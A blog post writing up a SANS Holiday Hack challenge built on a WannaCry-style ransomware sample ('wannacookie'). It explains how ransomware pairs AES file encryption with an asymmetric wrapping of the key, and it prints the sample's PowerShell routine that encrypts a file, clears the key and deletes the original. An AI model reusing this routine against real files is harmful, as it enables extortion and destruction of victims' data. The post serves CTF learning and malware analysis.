---
title: "Ransomware, AES Encryption and Decryption using PowerShell"
date: 2019-03-30
description: "How does ransomware use encryption? See an example in PowerShell"
summary: "How does ransomware use encryption? See an example in PowerShell"
tags: ["encryption", "ransomware", "AES", "PowerShell"]
---
I really enjoyed this year's SANS Holiday Hack (2018-19)! There were many great challenges, and many things to learn.

My favourite challenge was a **ransomware based challenge** where we were asked to analyse a live malware sample which was based off the WannaCry ransomware.

The malware was in the form of a word document (`.docm`) with a macro inside it that executed PowerShell. Once you decode the PowerShell code and debug it, you see functions provided for encrypting and decrypting files. Not only is this code super interesting, but also helps show how a well designed ransomware works. Although I **don't condone the use of ransomware**, I find it has an interesting problem with an even more interesting solution.

The problems that ransomware creators have:
* The ransomware should be able to encrypt files offline, while still being able to decrypt them if the software is back online
* The key used for encrypting should not be the same as the key used for decrypting. If it is the same, you have to protect it in some way so that it's not easily retrievable after the encryption process has finished.
* The algorithms used should be sound, and the key lengths large
* The encryption process should be fast to encrypt as many files as quickly as possible when run
* Ransomware creators may want to offer a service where they are are provided the money and want to provide the user with the decryption key to get back their data

The solution:
* Use symmetric cryptography for encryption and decryption of files. The key is generated on the compromised host.
* Use asymmetric cryptography to encrypt the symmetric encryption key. Specifically, the public key is used to encrypt it, and the private key is stored and protected on the ransomware author's machine.
* When the ransomware is finished running, the symmetric key is deleted from memory while the encrypted version of this key is kept for future decryption
* When decryption is required, use the asymmetric decryption key to decrypt the symmetric encryption key

For people who like pictures, here's a good simple explanation of how WannaCry works:
https://sensorstechforum.com/wp-content/uploads/2017/05/sensorstechforum-remove-file-encryption-of-wannacry-2-0-ransomware.jpg

The benefits of the solution:
* **Symmetric crypto is faster**, but has the drawback that the encryption and decryption key is the same
* The ransomware does not need to be online as the key used for encryption is generated offline
* **Asymmetric crypto protects the symmetric encryption key**, and makes it easy for the ransomware author to decrypt it with their private key
* The ransomware authors do not need access to the compromised host to provide the decryption key

The cipher used in the SANS Holiday Hack Ransomware challenge was AES. The codebase in the ransomware included code for both encrypting and decrypting files.

The following is the powershell code provided for encrypting and decrypting files for the wannacookie ransomware (the ransomware provided in the SANS Holiday Hack challenges). It includes a ```$enc_it``` parameter to switch between encrypting and decrypting. I have also provided the ```$key``` parameter which is the actual key used to encrypt Alabaster's elf database in the challenge.

```powershell
function H2B {
    param($HX);
    $HX = $HX -split '(..)' | Where-Object {
        $_
    };
    foreach ($value in $HX) {
        [Convert]::ToInt32($value,16)
    }
    
};

$key = "fbcfc121915d99cc20a3d3d5d84f8308";
$key = $(H2B $key);
$file = gci C:\Users\Test\Documents\alabaster_passwords.elfdb.wannacookie;

#[byte[]]$key = $key;
$Suffix = "`.wannacookie";
[System.Reflection.Assembly]::LoadWithPartialName('System.Security.Cryptography');
[System.Int32]$KeySize = $key.Length * 8;
$AESP = New-Object 'System.Security.Cryptography.AesManaged';
$AESP.Mode = [System.Security.Cryptography.CipherMode]::CBC;
$AESP.BlockSize = 128;
$AESP.KeySize = $KeySize;
$AESP.Key = $key;
$FileSR = New-Object System.IO.FileStream ($File,[System.IO.FileMode]::Open);
if ($enc_it) {
    $DestFile = $File + $Suffix
}
else {
    $DestFile = ($File -replace $Suffix)
}
;
$FileSW = New-Object System.IO.FileStream ($DestFile,[System.IO.FileMode]::Create);
if ($enc_it) {
    $AESP.GenerateIV();
    $FileSW.Write([System.BitConverter]::GetBytes($AESP.IV.Length),0,4);
    $FileSW.Write($AESP.IV,0,$AESP.IV.Length);
    $Transform = $AESP.CreateEncryptor()
}
else {
    [Byte[]]$LenIV = New-Object Byte[] 4;
    $FileSR.Seek(0,[System.IO.SeekOrigin]::Begin) | Out-Null;
    $FileSR.Read($LenIV,0,3) | Out-Null;
    [int]$LIV = [System.BitConverter]::ToInt32($LenIV,0);
    [Byte[]]$IV = New-Object Byte[] $LIV;
    $FileSR.Seek(4,[System.IO.SeekOrigin]::Begin) | Out-Null;
    $FileSR.Read($IV,0,$LIV) | Out-Null;
    $AESP.IV = $IV;
    $Transform = $AESP.CreateDecryptor()
}
;
$CryptoS = New-Object System.Security.Cryptography.CryptoStream ($FileSW,$Transform,[System.Security.Cryptography.CryptoStreamMode]::Write);
[int]$Count = 0;
[int]$BlockSzBts = $AESP.BlockSize / 8;
[Byte[]]$Data = New-Object Byte[] $BlockSzBts;
do {
    $Count = $FileSR.Read($Data,0,$BlockSzBts);
    $CryptoS.Write($Data,0,$Count)
}
while ($Count -gt 0);
$CryptoS.FlushFinalBlock();
$CryptoS.Close();
$FileSR.Close();
$FileSW.Close();
Clear-Variable -Name "key";
Remove-Item $File
```


Big thanks to the SANS Holiday Hack organisers for providing a great learning experience!

Cya guys next time!